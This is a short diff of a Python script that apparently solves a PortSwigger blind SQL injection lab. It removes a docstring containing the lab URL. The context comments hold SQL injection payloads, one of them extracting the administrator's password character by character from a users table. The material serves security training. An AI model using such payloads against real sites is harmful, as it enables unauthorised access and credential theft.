@@ -1,7 +1,3 @@
-"""
-code in process
-https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
-"""
 import sys
 import logging
 import urllib3
@@ -117,9 +113,7 @@ if __name__ == "__main__":
 
 #xyz' or (select substring('abcd', 1,1) = 'a')--             // the same response (true)
 # and botta my own builded payload:  xyz' or substring((select password from users where username = 'administrator')1,1) = '{char}'
-"""
-ок
-"""
+
    
     
 """
